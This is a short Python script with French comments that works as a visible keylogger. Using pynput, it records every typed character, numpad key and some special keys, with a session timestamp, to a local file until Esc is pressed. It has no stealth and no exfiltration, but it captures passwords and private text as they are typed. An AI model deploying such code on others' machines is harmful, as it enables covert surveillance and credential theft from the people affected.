from pynput import keyboard
import datetime

# Nom du fichier de log
LOG_FILE = "keylog.txt"

# Mapping manuel pour le Pavé Numérique
NUMPAD_MAP = {
    96: "0", 97: "1", 98: "2", 99: "3",
    100: "4", 101: "5", 102: "6", 103: "7",
    104: "8", 105: "9",
    106: "*", 107: "+",
    109: "-", 110: ".", 111: "/"
}

def write_to_file(text):
    """
    Ouvre le fichier en mode ajout ('a'), écrit le texte et referme tout de suite.
    L'encodage utf-8 est crucial pour les accents.
    """
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(text)
    except Exception as e:
        print(f"Erreur d'écriture : {e}")

def on_press(key):
    key_data = ""

    # 1. Gestion du Pavé Numérique
    if hasattr(key, 'vk') and key.vk in NUMPAD_MAP:
        key_data = NUMPAD_MAP[key.vk]

    # 2. Gestion des caractères standards (Lettres, chiffres, symboles)
    elif hasattr(key, 'char') and key.char is not None:
        key_data = key.char

    # 3. Gestion des touches spéciales pour la mise en forme du log
    elif key == keyboard.Key.space:
        key_data = " "
    elif key == keyboard.Key.enter:
        key_data = "\n"  # Saut de ligne dans le fichier
    elif key == keyboard.Key.tab:
        key_data = "\t"
    elif key == keyboard.Key.backspace:
        key_data = "[DEL]" # Indique une suppression pour la clarté

    # 4. On ignore les autres touches (Maj, Ctrl, Alt) pour ne pas polluer le log
    # Si on veut tout logger, on peut ajouter un 'else' ici.

    # Écriture si on a capturé quelque chose
    if key_data:
        print(f"Écriture : {key_data.strip() if key_data.strip() else 'Espace/Entrée'}")
        write_to_file(key_data)

def on_release(key):
    if key == keyboard.Key.esc:
        print(f"\nFin de l'enregistrement. Données sauvegardées dans {LOG_FILE}")
        return False

# --- Démarrage ---
print(f"--- Enregistrement des frappes dans '{LOG_FILE}' ---")
# On ajoute une ligne de séparation avec la date au début du fichier
write_to_file(f"\n\n--- Session du {datetime.datetime.now()} ---\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()